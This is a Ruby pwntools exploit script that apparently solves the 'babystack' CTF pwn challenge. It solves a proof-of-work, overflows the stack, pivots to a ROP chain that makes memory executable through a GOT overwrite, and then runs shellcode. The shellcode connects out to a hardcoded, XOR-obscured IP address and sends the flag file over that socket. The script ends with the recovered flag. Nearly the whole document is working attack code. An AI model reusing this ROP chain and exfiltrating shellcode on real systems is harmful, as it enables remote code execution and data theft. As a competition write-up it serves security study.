#!/usr/bin/env ruby
# encoding: ascii-8bit
require 'pry'
require 'digest'
require 'pwn'        # https://github.com/peter50216/pwntools-ruby
require 'heapinfo'   # https://github.com/david942j/heapinfo
require 'one_gadget' # https://github.com/david942j/one_gadget

# @magic = one_gadget(file: './libc.so.6')[0]

host, port = '202.120.7.202', 6666
@local = false
if ARGV.empty?
  host = '127.0.0.1'; @local = true
else
  raise ArgumentError, 'host not set' if host.empty?
end
$z = Sock.new host, port
def z;$z;end
@p = 'babystack'
def h;@h ||= heapinfo(@p);end
def elf; @elf ||= ELF.new(@p); end
#================= Exploit Start ====================
context.log_level = :debug
def pow
  chal = z.gets.strip
  sol = (2 ** 32).downto(0).find do |v|
    Digest::SHA256.digest(chal + v.p32).start_with?("\x00" * 3)
  end
  z.write sol.p32
end
pow unless @local

new_stk = 0x0804a800
leave_ret = 0x080483a8
payload = ''
rop1 = flat(
  'A' * 40,
  new_stk - 4, # ebp
  elf.plt.read,
  leave_ret,
  0, new_stk, 256 - 64
)
fail unless rop1.size <= 64
payload << rop1
magic = 0x0804847e
# 0x0804847e : add byte ptr [ebx - 0x723603b3], cl ; popal ; cld ; ret
pop_ebx = 0x080482e9
pop3_ret = 0x080484e9
rop2 = flat(
  elf.plt.read,
  pop3_ret,
  0, 11, 0, # for setting ecx = 11
  pop_ebx,
  elf.got.alarm + 0x723603b3,
  magic,
  0.p32 * 4,
  (new_stk & -4096).p32, # ebx
  7.p32, # edx
  4096.p32, # ecx
  125.p32, # eax
  elf.plt.alarm,
  # shellcode
)
payload << rop2
payload << p32(new_stk + 4 + rop2.size) # start of shellcode
p payload.size
code = <<-EOS
/* open new socket, save it */
    /* open new socket */
    /* socketcall(AF_INET (2), SOCK_STREAM (1), 0) */
    /* push 0 */
    push 1
    dec byte ptr [esp] /* socklen_t addrlen */
    /* push SOCK_STREAM (1) */
    push 1     /* sockaddr *addr */
    /* push AF_INET (2) */
    push 2       /* sockfd */
    /* call socketcall(SYS_socketcall_socket (1), 'esp') */
    push 0x66 /* SYS_socketcall */
    pop eax
    push 1 /* SYS_socketcall_socket */
    pop ebx
    mov ecx, esp
    int 0x80
    mov edx, eax

/* push sockaddr, connect() */
    push 0x671f708c
    push 0x1010101
    xor dword ptr [esp], 0xbe270103
    mov ecx, esp
    /* socketcall('edx', 'ecx', 0x10) */
    /* push 0x10 */
    push 0x10 /* socklen_t addrlen */
    push ecx     /* sockaddr *addr */
    push edx       /* sockfd */
    /* call socketcall(SYS_socketcall_connect (3), 'esp') */
    push 0x66 /* SYS_socketcall */
    pop eax
    push 3 /* SYS_socketcall_connect */
    pop ebx
    mov ecx, esp
    int 0x80
EOS
payload << asm(
  "sub esp, 0x100\n" +
  code +
  shellcraft.cat('/home/babystack/flag', fd: 3)
)
p payload.size
fail if payload.size > 256

# STDIN.gets
z.write payload.ljust(256, 'A')

z.interact

# flag{return_to_dlresolve_for_warming_up}
